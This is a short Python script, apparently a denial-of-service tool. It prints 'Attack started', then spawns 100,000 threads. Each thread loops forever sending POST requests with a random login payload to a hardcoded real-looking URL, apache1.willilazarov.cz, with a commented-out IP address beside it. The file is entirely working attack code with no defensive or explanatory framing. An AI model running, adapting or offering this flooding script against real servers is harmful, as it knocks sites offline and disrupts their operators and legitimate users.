import threading
import time
import requests
import string
import random


def login():
    msg = str(string.ascii_letters)
    random_username = "".join(random.sample(msg, 3))
    payload = {'username': random_username,
               'password': random_username,
               'login': 'login'
               }
    # infinite loop
    while 2 > 1:
        try:
            # instance to make a post request to the login url with  login details as a payload
            r = requests.Session()
            r.post(url, data=payload)
            r.close()
            print("=")
        except requests.exceptions.HTTPError as errh:
            print("Http Error:")
        except requests.exceptions.ConnectionError as errc:
            print("Error Connecting:")
        except requests.exceptions.Timeout as errt:
            print("Timeout Error:")
        except requests.exceptions.RequestException as err:
            print("OOps: Something Else")


if __name__ == '__main__':
    #ip = '109.238.43.202'
    url = 'http://apache1.willilazarov.cz/'
    num_requests = 100000
    print("Attack started")
    # Spawn a thread per request
    all_threads = []
    for i in range(num_requests):
        new_thread = threading.Thread(target=login)
        new_thread.start()
        all_threads.append(new_thread)
    # Make the main thread wait for the other threads
    for current_thread in all_threads:
        current_thread.join()
